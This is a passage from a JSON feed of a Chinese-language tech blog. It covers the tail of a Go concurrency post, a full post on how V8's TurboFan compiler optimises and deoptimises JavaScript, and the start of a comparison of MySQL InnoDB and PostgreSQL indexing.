operator\">&lt;-</span><span class=\"token keyword\">chan</span> <span class=\"token keyword\">interface</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">&lt;-</span><span class=\"token keyword\">chan</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&lt;-</span><span class=\"token keyword\">chan</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>\tchana <span class=\"token operator\">:=</span> <span class=\"token function\">make</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">chan</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span><br>\tchanb <span class=\"token operator\">:=</span> <span class=\"token function\">make</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">chan</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span><br>\t<span class=\"token keyword\">go</span> <span class=\"token keyword\">func</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>\t\t<span class=\"token keyword\">defer</span> <span class=\"token function\">close</span><span class=\"token punctuation\">(</span>chana<span class=\"token punctuation\">)</span><br>\t\t<span class=\"token keyword\">defer</span> <span class=\"token function\">close</span><span class=\"token punctuation\">(</span>chanb<span class=\"token punctuation\">)</span><br><br>\t\tchana <span class=\"token operator\">&lt;-</span> <span class=\"token number\">1</span><br>\t\tchanb <span class=\"token operator\">&lt;-</span> <span class=\"token number\">2</span><br>\t\t<span class=\"token keyword\">for</span> <span class=\"token punctuation\">{</span><br>\t\t\t<span class=\"token keyword\">select</span> <span class=\"token punctuation\">{</span><br>\t\t\t<span class=\"token keyword\">case</span> <span class=\"token operator\">&lt;-</span>done<span class=\"token punctuation\">:</span><br>\t\t\t\t<span class=\"token keyword\">return</span><br>\t\t\t<span class=\"token punctuation\">}</span><br>\t\t<span class=\"token punctuation\">}</span><br>\t<span class=\"token punctuation\">}</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><br><br>\t<span class=\"token keyword\">return</span> chana<span class=\"token punctuation\">,</span> chanb<br><span class=\"token punctuation\">}</span><br><br><span class=\"token keyword\">func</span> <span class=\"token function\">g</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>\t<span class=\"token function\">print</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><br>\t<span class=\"token function\">print</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><br><span class=\"token punctuation\">}</span><br><br><span class=\"token keyword\">func</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>\tdone <span class=\"token operator\">:=</span> <span class=\"token function\">make</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">chan</span> <span class=\"token keyword\">interface</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><br>\t<span class=\"token keyword\">defer</span> <span class=\"token function\">close</span><span class=\"token punctuation\">(</span>done<span class=\"token punctuation\">)</span><br><br>\tchana<span class=\"token punctuation\">,</span> chanb <span class=\"token operator\">:=</span> <span class=\"token function\">f</span><span class=\"token punctuation\">(</span>done<span class=\"token punctuation\">)</span><br>\ta <span class=\"token operator\">=</span> <span class=\"token operator\">&lt;-</span>chana<br>\tb <span class=\"token operator\">=</span> <span class=\"token operator\">&lt;-</span>chanb<br>\t<span class=\"token function\">g</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><br><span class=\"token punctuation\">}</span></code></pre>\n<h2 id=\"%E7%B5%90%E8%AB%96\"><a class=\"direct-link\" href=\"#%E7%B5%90%E8%AB%96\">#</a> 結論</h2>\n<p>撰寫 concurrency 的程式最困難的地方是，很多 bug 都是不確定的，無法複製的，這加大了 debug 的難度。</p>\n<p>深入瞭解 concurrency 的議題，以及你寫的每一行 code 背後是如何運行的，可以很大程度的幫助我們避免做錯事。同時，了解這些可以讓我們更體會語言的設計理念，也能幫助我們更好的撰寫符合該語言特性的安全高效 concurrency 程式。</p>\n",
      "date_published": "2021-05-03T00:00:00-00:00"
    },{
      "id": "https://tech-blog.cymetrics.io/posts/maxchiu/turbofan/",
      "url": "https://tech-blog.cymetrics.io/posts/maxchiu/turbofan/",
      "title": "從編譯器優化角度初探 Javascript的V8 引擎",
      "content_html": "<p><img src=\"/img/posts/max/DiveIntoTurbofan/1__NyZv46I1bYz4K7ngiT__W9Q.jpeg\" alt=\"\"></p>\n<!-- summary -->\n<p>這篇文章想以V8引擎對於JS的實現為例來探討編譯器優化的一些基礎議題並搭配實驗，希望能讓讀者對於血汗的編譯器到底在背後幫我們完成了多少事情有點概念。</p>\n<!-- summary -->\n<p>一般人對於 JS 這種 Scripting Language 的印象大概就是相比於 C++ 之類直接編譯成對應指令集的語言，因為是把 Source code 藉由 Interpreter 編譯成 跑在原生環境的 <a href=\"https://en.wikipedia.org/wiki/Virtual_machine\">Process VM</a> 上對應的 Bytecode，沒辦法直接在 Machine code 層級做優化，所以速度通常會慢了一截。</p>\n<p><img src=\"/img/posts/max/DiveIntoTurbofan/0__6JLpKVtBq4eIEljk.png\" alt=\"\"></p>\n<p>雖然 Bytecode 這種做法在執行時期速度顯然會較慢，但把 Source code 編譯成 Bytecode 形式，不僅僅是具備了“編譯一次，各平台通用”的跨平台的特性，同時 Bytecode 的指令層級也因為比較 High level， 相比於精確繁瑣的 Machine 層級指令，編譯 Bytecode 的速度通常會快出許多。</p>\n<p><img src=\"/img/posts/max/DiveIntoTurbofan/0__FK2W6kz9__36yXHnm.png\" alt=\"\"><br>\n<img src=\"/img/posts/max/DiveIntoTurbofan/0__pq5o__C__DCDLht__XB.png\" alt=\"\"></p>\n<p>以上圖為例，一個 result = 1 + obj.x 這樣的 source code，隨著指令層級的越低，編譯的複雜度和時間也會隨之提升。然而越精確的指令對 CPU 來說才可以發揮最高的硬體效能。 所以其實要把 Source code 抽象到怎樣的層級就是設計編譯器時一個很重要的 Issue。</p>\n<p>而許多基於 Bytecode 的語言為了能夠提升效率，引入了所謂的 <a href=\"https://zh.wikipedia.org/wiki/%E5%8D%B3%E6%99%82%E7%B7%A8%E8%AD%AF\">JIT</a> 技術，透過在執行時期分析常被執行的片段，同步地把這些片段的 profileing data 在背後偷偷餵進 optimizing compiler ，編譯成 Machine code 後偷偷的替換掉原本 bytecode 以提升運行的速度。（可以是從 <a href=\"https://www.google.com/search?q=abstract+syntax+tree&amp;sxsrf=ALeKk02ELy_J6aRB-LjA0fdC8u6fBk-ITA%3A1617433965743&amp;ei=bRVoYNz1LIOmmAXr6LfwBg&amp;oq=abstract+syn&amp;gs_lcp=Cgdnd3Mtd2l6EAEYADICCAAyAggAMgIIADICCAAyBQgAEMsBMgUIABDLATIFCAAQywEyBQgAEMsBMgUIABDLATIFCAAQywE6BAgjECc6BAgAEEM6BQgAELEDOggIABCxAxCDAToHCAAQsQMQQzoKCAAQsQMQRhD_AVDY_QhYtZAJYL2bCWgDcAB4AIABQIgBhQWSAQIxM5gBAKABAaoBB2d3cy13aXrAAQE&amp;sclient=gws-wiz\">AST</a> 也可以是從 Bytecode 優化）[2]</p>\n<p>V8 引擎目前所使用的 Optimizing Compiler叫做 <a href=\"https://v8.dev/\">TurboFan</a> ， 他使用了一套自訂的 IR [3] ，並用 Sea Of Nodes 取代傳統編譯器優化中使用的 CFG，大幅提升了優化策略的彈性，並實現了大部分語言都有的共通優化方式（ Inlining、Loop Splitting 、 Escape Analysis … etc )。(<strong>＊註一)</strong></p>\n<p>具體來說， Turbofan 採用的是所謂的推測式優化（ Speculative Optimization ）。動態語言因為允許不指名變數型別，執行期的 Machine 指令理當是無法確定（舉最簡單的例子 ，“＋”這個 operator 在 String 跟 Number 行為完全不一樣），但 Turbofan 根據 Runtime 時的 Profiling 資訊，“推測” 一些這段 Source Code 確切的型別。以函式呼叫來說， Turbofan會在執行期的每個 Function的Code Object裡面都額外帶上所謂的 <strong>Feedback Vector[4]</strong> ，用來統計一個函式的執行狀況。</p>\n<p><img src=\"/img/posts/max/DiveIntoTurbofan/0____DVw6OQA0S5z1Ryu.png\" alt=\"\"></p>\n<p>我們考慮一個簡單的狀況</p>\n<p><img src=\"/img/posts/max/DiveIntoTurbofan/0__ec5paOPfU9S1XkoU.png\" alt=\"\"></p>\n<p>這樣的話函式為例，若執行期數十次對這個函式的呼叫傳入的都是Integer，那麼 Feedback Vector 就會開始統計這些資訊，Turbofan 會開始在背後同步地把 Add( x, y)的 Bytecode 轉換成針對 Integer 操作的指令。</p>\n<p>然而推測性的優化終究只是推測性的，過了一陣子如果User突然對 Add 函式傳進了一個 String，V8引擎是不是就要爆掉了？畢竟連 Machine code 都已經把它當成 Integer 來操作了，難道要噴 Segmentation Fault了？</p>\n<p>實際上 TurboFan 在處理 JIT 優化時，並不只是單純的把對應的 code 轉成 machine code ， 而是會同時在 Code 中塞入所謂的 Checkpoint，執行優化過的 Machine code 函式 之前，會先檢查傳入的參數是否跟先前的假設一致，若假設不成立了，則進行 Deoptimization。<br>\n（這邊有個點要提醒，若 同一段 code Optimization-Deoptimization 這樣子的重複了五次以上，在 Turbofan 就會認定這是段 Megamorphic 的 Code，並放棄對他進行 JIT 優化）[7]</p>\n<p><img src=\"/img/posts/max/DiveIntoTurbofan/0__cSphl2MMRjAZlmi3.png\" alt=\"\"></p>\n<p>從上圖可以看到，優化過的機器碼中，實際的函數內指令是黃色的部分，藍色部分檢查參數是否為 Small Integer 型別，橘色部分檢查 object 的 Hidden Class (＊註二）是否相同。 若不相同就直接 Jump 到對應的處理程式碼。</p>\n<p>具體來說， 為了能順利 fallback 回去用 Bytecode 執行，Deoptimization 要做以下幾件事：</p>\n<ul>\n<li>把目前 memory stack 中的 frame 和 Register 中的資訊存進 buffer</li>\n<li>從 (optimized) frame 中重構出 interpreter 的 frame，若優化後的 frame 是 inlined 的，則必須依序建構出正確的 function stack (畢竟 interpreter 是沒有辦法做 inlining 優化的啊啊）</li>\n<li>把 Register 的值讀進新的 stack 需要的位置 （有沒有感覺跟 Context Switch 在做的事有點像XD)</li>\n<li>重新 Materialize 那些被 Turbofan 用 <a href=\"https://en.wikipedia.org/wiki/Escape_analysis\">Escape Analysis</a> 優化省略掉的物件實例</li>\n<li>把 Program counter 跳回去給 Interpreter</li>\n</ul>\n<p>以上這就是 V8引擎中所謂的 Eager Deoptimization。</p>\n<p>並且，若某個變數的 CheckPoint Fail了，所有其他會使用到同一個變數的函式也要 Deoptimize。然而實際上這些相依的函式因為不是在 Stack 的頂端，不能直接 Deoptimize ( 例如無法取得 register 的 snapshot )</p>\n<p><img src=\"/img/posts/max/DiveIntoTurbofan/0__WTJD__3E4soas9mJh.png\" alt=\"\"></p>\n<p>所以實務上 Turbofan 還有一招所謂的 Lazy Deoptimization。 在一開始編譯 Machine Code 時就會註冊函式和變數之間的 Dependency， 而若某一段code 改到了某個變數的 Shape，會在相依的函數中把原本要存取此變數的 code 區段先用一段 Patched instruction 替代。這個 instruction 的功用就是去呼叫Deoptimizer。這樣子我們就可以在執行到會出問題的片段時再去 Deoptimize了！</p>\n<p><img src=\"/img/posts/max/DiveIntoTurbofan/0______KJ__E7A8zUnQ2BP.png\" alt=\"\"></p>\n<p>以上就是我們偉大的 Turbofan 大大在我們跑 JS Code 時一直勞心勞力在做的事情。講了這麼多理論上的東西我想大家可能還是有點茫然，以下就用幾個簡單的實驗來探討一些 Turbofan 幫我們做的事情。</p>\n<p>讓我們考慮以下這個簡單的程式片段 test.js</p>\n<p><img src=\"/img/posts/max/DiveIntoTurbofan/0__tzW02alSCz__NNYJD.png\" alt=\"\"></p>\n<p>我們在 node 環境下執行 <strong>node — trace-opt — trace-deopt test.js | grep doSomething ，藉由 — trace-opt 和 — tract-deopt觀</strong>察 V8 在執行時動態優化和反優化時的行為**，**並用 <strong>perf_hook</strong> 紀錄執行時間 <strong>。</strong></p>\n<p><img src=\"/img/posts/max/DiveIntoTurbofan/0__ysU6PBHyDXMgEG4c.png\" alt=\"\"><br>\n<img src=\"/img/posts/max/DiveIntoTurbofan/0__Uk6z7x4EsoOieT2J.png\" alt=\"\"></p>\n<p>可以看到 Turbofan 確實在執行期間動態的去優化了 doSomething。 被 mark起來的 reason是 <strong>small function</strong>，也就是說 Turbofan 覺得可以進行 inlining的優化。</p>\n<blockquote>\n<p><em>Inlining 代表的是 假裝函式裡面的 code 像是直接在 caller 對函式的呼叫處展開。這樣的做法可以省略創建跟維護新的 stack frame 所需的時間。 TurboFan 中對於一個函式是否可以進行 Inlining 的標準可以參考 [9].</em></p>\n</blockquote>\n<p><img src=\"/img/posts/max/DiveIntoTurbofan/1__dBY1pw8ZHWqe__I__SfLGPyw.png\" alt=\"\"></p>\n<blockquote>\n<p><em>簡單來說，如果函式在 AST 中的 Node 數少於 200，且函式的 callstack 深度小於 5，就是一個合格的 Candidate。<br>\n但程式中可能會有大量的 Candidate，如果全部都展開可能過度消耗資源，所以 Turbofan 會考量函式的 Relative Call Frequency。也就是說，從 callstack 最下面的函式的執行次數開始，依序乘上每個函數在父函數每次執行時被執行到的比例（而非直接看函式被執行的絕對次數）。 此值越高的函式會越優先被 Inlining。</em></p>\n</blockquote>\n<p><img src=\"/img/posts/max/DiveIntoTurbofan/1__Tll__Gz2BbaIIYreX4s0H1g.png\" alt=\"\"></p>\n<blockquote>\n<p><em>另外如果我們在上面的執行中把 — no-turbo-inlining flag 打開來，可以看到效能也有明顯的下降</em></p>\n</blockquote>\n<p>接著我們把上面的 code 的第二個迴圈的型別改成 String。再重新執行一次。</p>\n<p><img src=\"/img/posts/max/DiveIntoTurbofan/0__aD0KzOXJwDqy__rXO.png\" alt=\"\"><br>\n<img src=\"/img/posts/max/DiveIntoTurbofan/0__Akv2Bje8G0v9ilEw.png\" alt=\"\"></p>\n<p>從上面這段 trace 可以看出來， Turbofan 對 doSomething 一樣先做了優化，接著因為參數型別不一致而進行了 Eager 的反優化（畢竟是傳入參數的問題，並不是動到了別的地方的 object ) 。並且在最後執行了 doSomething 函式裡面的 obj 的 <strong>Materialization</strong>。[8]</p>\n<blockquote>\n<p><em>Materialization 意味著的就是在優化時， Turbofan 把 obj 做了 “Escape Analysis” (De-materialization)，也就是說它分析了這段函式的執行狀況，認定 obj 這個物件從來都不會脫離當前的 scope。</em></p>\n</blockquote>\n<blockquote>\n<p><em>不會脫離當前 scope 代表的意義就是其實沒有必要把 obj 放到 heap 去（放到 Heap 最重要的意義就是為了讓別的 frame 可以存取到）， 直接把 obj 裡的property 都變成 local variable 放到 stack 裡面，可以提昇操作速度（畢竟放到 heap 的話就變成要先從 stack 讀變數在 heap 的位置再去拿）。</em></p>\n</blockquote>\n<blockquote>\n<p>舉例來說我們以上的 code 若做了 De-materialization，會變成這樣的形式</p>\n</blockquote>\n<p><img src=\"/img/posts/max/DiveIntoTurbofan/1__U__ToZYPMtzR8AZcc9cGqQA.png\" alt=\"\"><br>\n<img src=\"/img/posts/max/DiveIntoTurbofan/0__iyespGXRfBRYgYUm.png\" alt=\"\"></p>\n<blockquote>\n<p><em>當然，這些優化是不能在 Bytecode 層級做的，所以既然要反優化，就表示我們必須把 obj 重新放回 heap ，這就是所謂的 Materialization。</em></p>\n</blockquote>\n<p>但隨著後半的 iteration 傳入的型別都是 String， Turbofan 過了一段時間再次把 doSomething 編譯成了針對字串參數的機器碼。</p>\n<p><img src=\"/img/posts/max/DiveIntoTurbofan/0__AWTn6yUGsGVEZEgf.png\" alt=\"\"></p>\n<p>其實從上面的 trace 可以看出來，執行動態優化和反優化花費的時間大多都在 1ms 以下，然而最後的執行時間卻有如此大的差異，應該不難想像執行優化前跟優化後的代碼的效率有多大的差異了。</p>\n<p>再來我們看看這段程式碼的效率</p>\n<p><img src=\"/img/posts/max/DiveIntoTurbofan/0__4P7hndqriK0eWdQN.png\" alt=\"\"><br>\n<img src=\"/img/posts/max/DiveIntoTurbofan/0__KEMsyBqrOWpWdash.png\" alt=\"\"></p>\n<p>不難看出，如果每次呼叫 doSomething 時的參數型別都持續變化，對於 Turbofan 來說是很難進行有效率的優化的。 這也正是為什麼寫 JS 時我們應該要盡可能遵守固定參數型別的原因。（ 從另一方面來看，使用 Typescript 也是有執行期效率的考量，畢竟型別都固定了，對編譯器來說很好優化）</p>\n<p>接著考慮以下這段 code</p>\n<p><img src=\"/img/posts/max/DiveIntoTurbofan/0__frVKSQdgjWzqL__Ls.png\" alt=\"\"><br>\n<img src=\"/img/posts/max/DiveIntoTurbofan/0__L6lZmMx5NWshUaI__.png\" alt=\"\"></p>\n<p>如果我們把 <strong>yoo (obj)</strong> 這行的註解拿掉，就符合了我們上面所講的， Stack Top 的 Frame 更改了會被其他地方存取的變數的 Shape 的狀況。這會讓 couter += obj.x 這行機器碼指令因為 obj 的形狀改變而失效。 我們印出他的 trace-opt:</p>\n<p><img src=\"/img/posts/max/DiveIntoTurbofan/0__RBX4Eyd__16Ud7A__x.png\" alt=\"\"><br>\n<img src=\"/img/posts/max/DiveIntoTurbofan/0__kSr7ZNJFmbrhn1QG.png\" alt=\"\"></p>\n<p>我們可以看到，這次的 Deoptimization 是 soft 模式，也就是上面所談的 Lazy Deoptimization。</p>\n<h3 id=\"%E7%B5%90%E8%AB%96\"><a class=\"direct-link\" href=\"#%E7%B5%90%E8%AB%96\">#</a> 結論</h3>\n<p>這篇文章介紹了 V8 引擎和 Turbofan 執行大家的 JS Code 時的優化方式跟原理。 寫出來的 code 越穩定好分析，編譯器就可以做越進階的優化。</p>\n<p>其實絕大多數的 Web Application都是 IO-Bound 的，如何寫出讓 Compiler 好優化的 Code 可能在很多時候都不是個很關鍵的問題，畢竟寫出讓編譯器好優化的程式碼可能會破壞許多易用好維護的軟體設計原則。 但儘管如此，作為 Web 開發者相信對 JS 背後的執行環境有深一層的認識也是一件重要的事。</p>\n<p>＊註一 ： TurboFan 所採取的 Sea-of-Nodes 是編譯器用來表示程式行為的表示方式的一種。相比傳統上常用的 Control Flow Graph 在做指令的 Scheduling 時把 Basic block 當作 Scheduling 的原子單位， Sea-of-Nodes 把所有的資料跟操作都變成單一的節點，並用 Effect-edge 來維持程式流程中的 State 關係，提升了 Scheduling 的彈性。 有興趣的人可以參考 [1]和[4]。</p>\n<p>＊註二： V8 引擎中，具有相同的 Shape（ object 中所有 attribute 的 type 和name) 的 object 都會對應到一個相同的 Map，稱之為 Hidden class，裡面存放了這些 attribute 在 memory layout 中固定的 offset，是 V8 為了加速記憶體存取速度而出現的設計。[6]</p>\n<h3 id=\"references%3A\"><a class=\"direct-link\" href=\"#references%3A\">#</a> References:</h3>\n<p>[1] Turbofan JIT Design <a href=\"https://docs.google.com/presentation/d/1sOEF4MlF7LeO7uq-uThJSulJlTh--wgLeaVibsbb3tc/edit#slide=id.g5499b9c42_01170\">https://docs.google.com/presentation/d/1sOEF4MlF7LeO7uq-uThJSulJlTh--wgLeaVibsbb3tc/edit#slide=id.g5499b9c42_01170</a></p>\n<p>[2] An overview of Turbofan Compiler <a href=\"https://docs.google.com/presentation/d/1H1lLsbclvzyOF3IUR05ZUaZcqDxo7_-8f4yJoxdMooU/edit#slide=id.g18ceb14729_0_124\">https://docs.google.com/presentation/d/1H1lLsbclvzyOF3IUR05ZUaZcqDxo7_-8f4yJoxdMooU/edit#slide=id.g18ceb14729_0_124</a></p>\n<p>[3] Turbofan IR <a href=\"https://docs.google.com/presentation/d/1Z9iIHojKDrXvZ27gRX51UxHD-bKf1QcPzSijntpMJBM/edit#slide=id.g19134d40cb_0_0\">https://docs.google.com/presentation/d/1Z9iIHojKDrXvZ27gRX51UxHD-bKf1QcPzSijntpMJBM/edit#slide=id.g19134d40cb_0_0</a></p>\n<p>[4] An Introduction to TurboFan<br>\n <a href=\"https://www.mdeditor.tw/pl/po7T/zh-tw\">https://www.mdeditor.tw/pl/po7T/zh-tw</a></p>\n<p>[5] Deoptimization in V8 <a href=\"https://docs.google.com/presentation/d/1Z6oCocRASCfTqGq1GCo1jbULDGS-w-nzxkbVF7Up0u0/edit#slide=id.g19ea708688_0_10\">https://docs.google.com/presentation/d/1Z6oCocRASCfTqGq1GCo1jbULDGS-w-nzxkbVF7Up0u0/edit#slide=id.g19ea708688_0_10</a></p>\n<p>[6] V8 Hidden class <br>\n<a href=\"https://engineering.linecorp.com/en/blog/v8-hidden-class/\">https://engineering.linecorp.com/en/blog/v8-hidden-class/</a></p>\n<p>[7] V8 Function Optimization <br>\n<a href=\"https://erdem.pl/2019/08/v-8-function-optimization\">https://erdem.pl/2019/08/v-8-function-optimization</a></p>\n<p>[8] Escape Analysis in V8<br>\n <a href=\"https://www.youtube.com/watch?v=KiWEWLwQ3oI\">https://www.youtube.com/watch?v=KiWEWLwQ3oI</a></p>\n<p>[9] Turbofan Inlining Heuristics <a href=\"https://docs.google.com/document/d/1VoYBhpDhJC4VlqMXCKvae-8IGuheBGxy32EOgC2LnT8/edit\">https://docs.google.com/document/d/1VoYBhpDhJC4VlqMXCKvae-8IGuheBGxy32EOgC2LnT8/edit</a></p>\n<p>[10] JavaScript engine fundamentals: Shapes and Inline Caches<br>\n<a href=\"https://mathiasbynens.be/notes/shapes-ics\" title=\"https://mathiasbynens.be/notes/shapes-ics\">https://mathiasbynens.be/notes/shapes-ics</a></p>\n",
      "date_published": "2021-04-07T00:00:00-00:00"
    },{
      "id": "https://tech-blog.cymetrics.io/posts/maxchiu/indexing/",
      "url": "https://tech-blog.cymetrics.io/posts/maxchiu/indexing/",
      "title": "從Indexing的角度切入MySQL-Innodb與PostgreSQL的效能比較",
      "content_html": "<p><img src=\"/img/posts/max/IndexingComparisonOfMySQLAndPostgres/1__D99fysQ1Z0zfpa390g4QvQ.gif\" alt=\"\"></p>\n<p>如果你用的資料庫是屬於 Relational Database ，在這個年代用SQL進行資料庫的存取已經變成一件理所當然的事了。MySQL 、PostgreSQL 、MsSQL…不論是開源抑或是由大廠主導的 SQL 專案都擁有各自的擁護者 。</p>\n<p>其實如果單純以使用與操作的角度去這些不同的資料庫的官網和 document 看過一圈，可能不太容易看出有什麼關鍵性的差異。然而儘管這些資料庫在表面上看起來都提供了類似 Function ，但是對於同樣的一個邏輯， 不同家的資料庫之間的底層的物理實作卻有不少大相徑庭的地方。</p>\n<!-- summary -->\n<p>這篇文章想要以 MySQL (在本文中所參考的儲存引擎為 innodb ) 和PostgreSQL 為例，來討論一些 Relational Database 在底層操作資料時的一些基本原理。 更確切地說，從DB系統管理Index的方式來切入。</p>\n<!-- summary -->\n<h3 id=\"indexes-%3A-%E6%B1%BA%E5%AE%9A%E8%B3%87%E6%96%99%E5%AD%98%E5%8F%96%E9%80%9F%E5%BA%A6%E7%9A%84%E9%97%9C%E9%8D%B5\"><a class=\"direct-link\" href=\"#indexes-%3A-%E6%B1%BA%E5%AE%9A%E8%B3%87%E6%96%99%E5%AD%98%E5%8F%96%E9%80%9F%E5%BA%A6%E7%9A%84%E9%97%9C%E9%8D%B5\">#</a> Indexes : 決定資料存取速度的關鍵</h3>\n<p>首先來談談 MySQL 和 PostgreSQL 在資料儲存上最關鍵的差異 : Indexes 。</p>\n<p><a href=\"https://www.tutorialspoint.com/mysql/mysql-indexes.htm\">網路上的教學</a>都會說， 對於 table 中經常需要用來當作查詢依據的 column ，把它設成 index 速度就會提升。這背後的原因是因為對於資料庫背後儲存資料的 Data structure 來說 ，被選為 Index 的 Column 就會成為資料結構中的排序依據。</p>\n<p>“假設”某個資料庫背後是用 <a href=\"https://en.wikipedia.org/wiki/Binary_tree\">Binary Tree</a>（實際上通常是 <a href=\"https://zh.wikipedia.org/wiki/B%E6%A0%91\">B-Tree</a> 的各種延伸版本）來當作核心資料結構的話，一筆資料的 row 就是一個 node。 那例如說在下圖的資料結構，一筆資料會有Name、Height、id 三個欄位，那當我們把欄位 “ id” 設為 index的話 ，這棵樹（也就是資料庫存放資料的結構）就會照著 id 的值來排序。</p>\n<p><img src=\"/img/posts/max/IndexingComparisonOfMySQLAndPostgres/0__lAtWJh8SO8RBVIxR.png\" alt=\"\"></p>\n<p>看到這裡有自己設計過 DB Schema 的朋友們可能就會好奇，</p>\n<blockquote>\n<p>“咦但是有時候我同一張 table 裡面會有好幾個 column 會設成 index 耶</p>\n</blockquote>\n<blockquote>\n<p>那這樣資料庫要以哪個為基準排序啊？”</p>\n</blockquote>\n<p>在討論這個問題前我們必須先瞭解兩個概念：clustered index 和 non-clustered index。</p>\n<h3 id=\"clustered-index-%E8%88%87-non-clustered-index\"><a class=\"direct-link\" href=\"#clustered-index-%E8%88%87-non-clustered-index\">#</a> Clustered Index 與 Non-Clustered Index</h3>\n<p>如果要用一句話概括說明這兩者的差異，可以說 Clustered Index 是“完整資料(包含所有 column）在 Storage 中實際上的排序依據 ” 而 Non-clustered Index則是 “跟完整資料分開來放的欄位子集合的排序依據”。</p>\n<p>說得白話一點就是完整的資料在 storage 裡面用 clustered-index 當作排序依據， clustered-index 相近的資料在 storage 中也會在比較接近的位置。 且因爲他是實際上 storage 在 partition 資料時的依據，所以只能有一個 clustered index。</p>\n<p>而資料庫會另外複製幾份被使用者選為 non-clustered index 的 column 資料， 在其他 storage 的空間創造只包含這些 non-clustered index 的資料結構。每多一個 index 就多創造一份。而這些 non-clustered index 跟實際上 storage中的資料的物理位置沒有直接的關連。</p>\n<p>以上面的例子為例， id（預設是 Primary Key）就是 clustered index ，而如果使用者在 name 和 height 上都 create index 的話（預設狀況 create 新的 index 就是 non-clustered index），資料庫會創造出額外的兩份複製的子集合資料結構。</p>\n<p><img src=\"/img/posts/max/IndexingComparisonOfMySQLAndPostgres/0__vIig59JPmcPAXOZ9.png\" alt=\"\"><br>\n<img src=\"/img/posts/max/IndexingComparisonOfMySQLAndPostgres/0__vsWcHf9LzLOdY__D3.png\" alt=\"\"></p>\n<p>這兩個新的 tree 分別各自以不同的 non-clustered index 進行排序.。當使用者要查詢資料時， 資料庫就會從判斷指令中的條件使用的欄位是否是有被設為index 的欄位，有的話就會從對應的 tree 裡面尋找。</p>\n<p>例如下 <strong>SELECT * WHERE Height &gt; 165</strong> ，資料庫不會從圖一中原本包含完整資料的結構中尋找， 而是會從複製出來的圖二的結構中尋找對應的 node。</p>\n<p>然而眼尖的朋友可能發現, 如果是**SELECT ***的話，就算在圖二的 tree 中找到了需要的 nodes，裡面也沒有包含其他欄位的資料讓我回傳啊！</p>\n<p>一個可能的解法是在 create index 時下<strong>INCLUDE</strong> clause ，可以讓資料庫在創建新的 non-clustered index tree 時把被 include 的欄位資料一起放進去。 但是如果 table 中的欄位很多，那這樣每次要 create 新的 index 時創造出來的新的tree 就會無敵大，對 storage 是一個大負荷。</p>\n<p>所以實際上除了用 clustered index 排序的原本資料外，這些額外的 index tree的節點都還包括了一個 field，放的正是 clustered index。 例如圖二以 height 當non-clustered index 的 tree 中實際上會有額外對應的 clustered index (此例中也就是 id )</p>\n<p><img src=\"/img/posts/max/IndexingComparisonOfMySQLAndPostgres/0__oM__jfRfuw6nkKmE5.png\" alt=\"\"></p>\n<p><strong>SELECT * WHERE Height &gt; 165</strong>這個指令在查詢時就會變成先從此樹中找到符合條件的node，再用對應的clustered index(id)去圖一中的樹查詢。</p>\n<p><img src=\"/img/posts/max/IndexingComparisonOfMySQLAndPostgres/0__FgE15QZVAhf__hZhu.png\" alt=\"\"></p>\n<p>以上這個流程就是 ＭySQL-Innodb 中用 index 加速資料查詢的流程和原理</p>\n<p>看來很完美！ 收工～</p>\n<p>..</p>\n<p>…</p>\n<p>……</p>\n<p>然而現實總是殘酷的， 這樣的流程有個潛在的大問題。</p>\n<p>先從 non-clustered index 取得 clustered index 再去查詢，看起來只是從查詢一次變成兩次而已， 然而實際上如果進行非常大範圍的Range Query， non-clustered index一個range中對應的clustered-index資料在實際硬碟的存放位置是非常散亂的，這個查詢clustered-index tree的步驟會在Storage中發生非常巨量的Random Access,效能的大幅下降是可以預期。</p>\n<p>如果我們想要 Select 全部的欄位，但是卻不想要回去 clustered-index tree 裡面查詢， 有辦法嗎？</p>\n<h3 id=\"postgresql%E7%9A%84%E8%A7%A3%E6%B3%95%EF%BC%9A\"><a class=\"direct-link\" href=\"#postgresql%E7%9A%84%E8%A7%A3%E6%B3%95%EF%BC%9A\">#</a> PostgreSQL的解法：</h3>\n<p>PostgreSQL看到了 MySQL-Innodb 中這樣的痛點， 所以在設計上採取了一個策略 ： 不使用 clustered index tree。</p>\n<p>沒有 clustered index 意味著的就是完整的原始資料無法進行排序（因為沒有排序的依據） 在 PostgreSQL 的中存放完整資料的地方稱之為 Heap。 這個Heap 是個無序的結構，每一筆資料存在 storage 中是不給予這些資料順序任何的保證的。</p>\n<p>而 non-clustered index 的部分,，PostgreSQL 則是從在每個 node 裡面儲存Clustered-index，改成儲存一個指向 Heap 中對應完整資料的 row 所在位置的指標. (注意此處的指標不是 memory 的指標，而是用來在資料庫中標記唯一所在位置的 <a href=\"https://www.postgresql.org/docs/8.0/storage-page-layout.html\">Page</a> 的資訊) *</p>\n<p><img src=\"/img/posts/max/IndexingComparisonOfMySQLAndPostgres/0__y9JhQLyEkTuIgTJQ.png\" alt=\"\"></p>\n<blockquote>\n<p>看到這裡可能會有人想問,“那為何 MySQL不也直接在 Non-clustered index tree的 node 中存放指標就好了？</p>\n</blockquote>\n<p>這點也正是 PostgreSQL 以 Heap 存放原始完整資料的主要原因. 因為 Heap 不保證資料順序,所以任何資料被 update 或 insert ，現有的其他資料都不需要變更存放的位置, 相較之下 Innodb 因為是依照 clustered index 來排序,任何資料的 clustered index 被更改或插入新的資料都會造成其他資料的存放位置依照index 發生相對應的變化。<br>\n（以 B-Tree 來說, 會為了維持 tree 的 